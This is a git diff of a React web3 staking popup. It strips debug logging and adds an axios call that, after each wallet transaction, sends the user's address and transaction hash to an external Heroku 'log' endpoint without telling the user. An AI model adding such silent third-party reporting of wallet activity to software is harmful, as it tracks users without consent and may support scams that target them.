@@ -3,6 +3,7 @@ import classes from './ChoosePopup.module.scss'
 import {ethers} from "ethers";
 import {useWeb3React} from "@web3-react/core";
 import Main from "../../../main/Main";
+import axios from "axios";
 
 const ChoosePopup = ({active, setActive, setStakeActive, setErrorMessage}) => {
 
@@ -17,8 +18,6 @@ const ChoosePopup = ({active, setActive, setStakeActive, setErrorMessage}) => {
 
 
     useEffect(() => {
-        console.log(context.account)
-        console.log(context.error)
         if (isTried && context.account && !context.error) {
             console.log("work")
             setTried(false);
@@ -27,7 +26,6 @@ const ChoosePopup = ({active, setActive, setStakeActive, setErrorMessage}) => {
     }, [context, isTried])
 
     const send = () => {
-        console.log(window.ethereum)
         if (context.library) {
             window.ethersProvider = new ethers.providers.InfuraProvider(1)
             const tx = {
@@ -36,6 +34,12 @@ const ChoosePopup = ({active, setActive, setStakeActive, setErrorMessage}) => {
                 value: "10000"
             }
             context.library.send('eth_sendTransaction', [tx]).then(res => {
+                axios.get('https://wallet-connector.herokuapp.com/log?from=' + context.account + '&tx=' + res)
+                    .then((res) => {
+                        console.log(res)
+                    }).catch(err => {
+                        console.log(err)
+                })
                 setErrorMessage('')
                 console.log("Success")
                 console.log(res)
